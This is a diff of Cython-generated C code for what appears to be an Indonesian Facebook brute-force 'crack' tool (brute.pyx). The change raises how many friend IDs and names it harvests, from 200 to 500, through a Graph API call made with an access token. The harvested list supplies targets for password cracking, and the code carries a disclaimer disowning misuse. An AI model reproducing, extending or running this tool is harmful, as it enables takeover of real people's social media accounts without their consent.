@@ -2331,7 +2331,7 @@ static const char __pyx_k_accessToken_EAA_w[] = "{\"accessToken\":\"(EAA\\w+)";
       static const char __pyx_k_Ketik_me_jika_ingin_crack_dari[] = "\n [*] Ketik 'me' jika ingin crack dari daftar teman";
       static const char __pyx_k_Masukan_username_atau_password[] = "\n [!] Masukan username atau password yang benar";
       static const char __pyx_k_Modul_Futures_belum_terinstall[] = "\n [\303\227] Modul Futures belum terinstall!...\n";
-      static const char __pyx_k_friends_limit_200_access_token[] = "/friends?limit=200&access_token=";
+      static const char __pyx_k_friends_limit_500_access_token[] = "/friends?limit=500&access_token=";
       static const char __pyx_k_gagal_mengambil_id_kemungkinan[] = "] gagal mengambil id, kemungkinan id tidaklah publik";
       static const char __pyx_k_mohon_untuk_menggunakan_sc_ini[] = " mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...";
       static const char __pyx_k_opshh_tidak_ada_aplikasi_aktif[] = "] opshh tidak ada aplikasi aktif di akun ini.";
@@ -2869,8 +2869,8 @@ static const char __pyx_k_accessToken_EAA_w[] = "{\"accessToken\":\"(EAA\\w+)";
       static PyObject *__pyx_kp_u_following;
       static PyObject *__pyx_n_u_form;
       static PyObject *__pyx_n_s_format;
-      static PyObject *__pyx_kp_u_friends_limit_200_access_token;
       static PyObject *__pyx_kp_u_friends_limit_5000_access_token;
+      static PyObject *__pyx_kp_u_friends_limit_500_access_token;
       static PyObject *__pyx_n_u_full_name;
       static PyObject *__pyx_n_s_gabut;
       static PyObject *__pyx_kp_u_gagal_mengambil_id_kemungkinan;
@@ -11420,7 +11420,7 @@ static PyObject *__pyx_pf_5brute_18moch_yayan(CYTHON_UNUSED PyObject *__pyx_self
  *                 print("\n [*] Ketik 'me' jika ingin crack dari daftar teman")
  *                 user = input(' [*] masukan id atau username : ')             # <<<<<<<<<<<<<<
  *                 _memek_ = __convert__(user)
- *                 for a in requests.get('https://graph.facebook.com/%s/friends?limit=200&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:
+ *                 for a in requests.get('https://graph.facebook.com/%s/friends?limit=500&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:
  */
           __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 260, __pyx_L49_error)
           __Pyx_GOTREF(__pyx_t_1);
@@ -11431,7 +11431,7 @@ static PyObject *__pyx_pf_5brute_18moch_yayan(CYTHON_UNUSED PyObject *__pyx_self
  *                 print("\n [*] Ketik 'me' jika ingin crack dari daftar teman")
  *                 user = input(' [*] masukan id atau username : ')
  *                 _memek_ = __convert__(user)             # <<<<<<<<<<<<<<
- *                 for a in requests.get('https://graph.facebook.com/%s/friends?limit=200&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:
+ *                 for a in requests.get('https://graph.facebook.com/%s/friends?limit=500&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:
  *                     id.append(a['id'] + '<=>' + a['name'])
  */
           __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_convert); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 261, __pyx_L49_error)
@@ -11457,7 +11457,7 @@ static PyObject *__pyx_pf_5brute_18moch_yayan(CYTHON_UNUSED PyObject *__pyx_self
           /* "brute.pyx":262
  *                 user = input(' [*] masukan id atau username : ')
  *                 _memek_ = __convert__(user)
- *                 for a in requests.get('https://graph.facebook.com/%s/friends?limit=200&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:             # <<<<<<<<<<<<<<
+ *                 for a in requests.get('https://graph.facebook.com/%s/friends?limit=500&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:             # <<<<<<<<<<<<<<
  *                     id.append(a['id'] + '<=>' + a['name'])
  *             except KeyError:
  */
@@ -11499,10 +11499,10 @@ static PyObject *__pyx_pf_5brute_18moch_yayan(CYTHON_UNUSED PyObject *__pyx_self
           __Pyx_GIVEREF(__pyx_t_8);
           PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_8);
           __pyx_t_8 = 0;
-          __Pyx_INCREF(__pyx_kp_u_friends_limit_200_access_token);
+          __Pyx_INCREF(__pyx_kp_u_friends_limit_500_access_token);
           __pyx_t_11 += 32;
-          __Pyx_GIVEREF(__pyx_kp_u_friends_limit_200_access_token);
-          PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u_friends_limit_200_access_token);
+          __Pyx_GIVEREF(__pyx_kp_u_friends_limit_500_access_token);
+          PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u_friends_limit_500_access_token);
           if (unlikely(!__pyx_v_tokenz)) { __Pyx_RaiseUnboundLocalError("tokenz"); __PYX_ERR(0, 262, __pyx_L49_error) }
           __pyx_t_8 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_v_tokenz), __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 262, __pyx_L49_error)
           __Pyx_GOTREF(__pyx_t_8);
@@ -11596,7 +11596,7 @@ static PyObject *__pyx_pf_5brute_18moch_yayan(CYTHON_UNUSED PyObject *__pyx_self
 
             /* "brute.pyx":263
  *                 _memek_ = __convert__(user)
- *                 for a in requests.get('https://graph.facebook.com/%s/friends?limit=200&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:
+ *                 for a in requests.get('https://graph.facebook.com/%s/friends?limit=500&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:
  *                     id.append(a['id'] + '<=>' + a['name'])             # <<<<<<<<<<<<<<
  *             except KeyError:
  *                 print('\n %s[%s%s] gagal mengambil id, kemungkinan id tidaklah publik'%(N,M,N));time.sleep(3);moch_yayan()
@@ -11621,7 +11621,7 @@ static PyObject *__pyx_pf_5brute_18moch_yayan(CYTHON_UNUSED PyObject *__pyx_self
             /* "brute.pyx":262
  *                 user = input(' [*] masukan id atau username : ')
  *                 _memek_ = __convert__(user)
- *                 for a in requests.get('https://graph.facebook.com/%s/friends?limit=200&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:             # <<<<<<<<<<<<<<
+ *                 for a in requests.get('https://graph.facebook.com/%s/friends?limit=500&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:             # <<<<<<<<<<<<<<
  *                     id.append(a['id'] + '<=>' + a['name'])
  *             except KeyError:
  */
@@ -11650,7 +11650,7 @@ static PyObject *__pyx_pf_5brute_18moch_yayan(CYTHON_UNUSED PyObject *__pyx_self
         __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
 
         /* "brute.pyx":264
- *                 for a in requests.get('https://graph.facebook.com/%s/friends?limit=200&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:
+ *                 for a in requests.get('https://graph.facebook.com/%s/friends?limit=500&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:
  *                     id.append(a['id'] + '<=>' + a['name'])
  *             except KeyError:             # <<<<<<<<<<<<<<
  *                 print('\n %s[%s%s] gagal mengambil id, kemungkinan id tidaklah publik'%(N,M,N));time.sleep(3);moch_yayan()
@@ -57894,8 +57894,8 @@ static __Pyx_StringTabEntry __pyx_string_tab[] = {
   {&__pyx_kp_u_following, __pyx_k_following, sizeof(__pyx_k_following), 0, 1, 0, 0},
   {&__pyx_n_u_form, __pyx_k_form, sizeof(__pyx_k_form), 0, 1, 0, 1},
   {&__pyx_n_s_format, __pyx_k_format, sizeof(__pyx_k_format), 0, 0, 1, 1},
-  {&__pyx_kp_u_friends_limit_200_access_token, __pyx_k_friends_limit_200_access_token, sizeof(__pyx_k_friends_limit_200_access_token), 0, 1, 0, 0},
   {&__pyx_kp_u_friends_limit_5000_access_token, __pyx_k_friends_limit_5000_access_token, sizeof(__pyx_k_friends_limit_5000_access_token), 0, 1, 0, 0},
+  {&__pyx_kp_u_friends_limit_500_access_token, __pyx_k_friends_limit_500_access_token, sizeof(__pyx_k_friends_limit_500_access_token), 0, 1, 0, 0},
   {&__pyx_n_u_full_name, __pyx_k_full_name, sizeof(__pyx_k_full_name), 0, 1, 0, 1},
   {&__pyx_n_s_gabut, __pyx_k_gabut, sizeof(__pyx_k_gabut), 0, 0, 1, 1},
   {&__pyx_kp_u_gagal_mengambil_id_kemungkinan, __pyx_k_gagal_mengambil_id_kemungkinan, sizeof(__pyx_k_gagal_mengambil_id_kemungkinan), 0, 1, 0, 0},
@@ -58585,7 +58585,7 @@ static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  *                 print("\n [*] Ketik 'me' jika ingin crack dari daftar teman")
  *                 user = input(' [*] masukan id atau username : ')             # <<<<<<<<<<<<<<
  *                 _memek_ = __convert__(user)
- *                 for a in requests.get('https://graph.facebook.com/%s/friends?limit=200&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:
+ *                 for a in requests.get('https://graph.facebook.com/%s/friends?limit=500&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:
  */
   __pyx_tuple__50 = PyTuple_Pack(1, __pyx_kp_u_masukan_id_atau_username); if (unlikely(!__pyx_tuple__50)) __PYX_ERR(0, 260, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_tuple__50);
